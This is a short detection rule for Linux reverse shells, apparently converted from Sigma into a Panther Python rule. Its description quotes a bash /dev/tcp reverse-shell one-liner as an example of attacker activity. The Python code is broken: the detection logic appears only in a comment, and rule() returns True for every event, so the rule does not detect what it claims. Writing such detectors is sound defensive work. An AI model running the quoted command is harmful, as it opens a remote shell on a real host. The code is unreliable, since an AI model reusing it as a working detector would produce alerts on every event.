# Title: Linux Reverse Shell Indicator
# ID: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
# Status: test
# Level: critical
# Author: Florian Roth (Nextron Systems)
# Date: 2021-10-16
# Tags: attack.execution, attack.t1059.004
# Description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
# Converted by: Sigma Universal SIEM/EDR CLI

# Panther Detection Rule: Linux Reverse Shell Indicator
def rule(event):
    # Detection Logic:
    # ((Image="*/bin/bash") AND NOT (((DestinationIp="127.0.0.1" OR DestinationIp="0.0.0.0"))))
    return True

def title(event):
    return "Linux Reverse Shell Indicator"

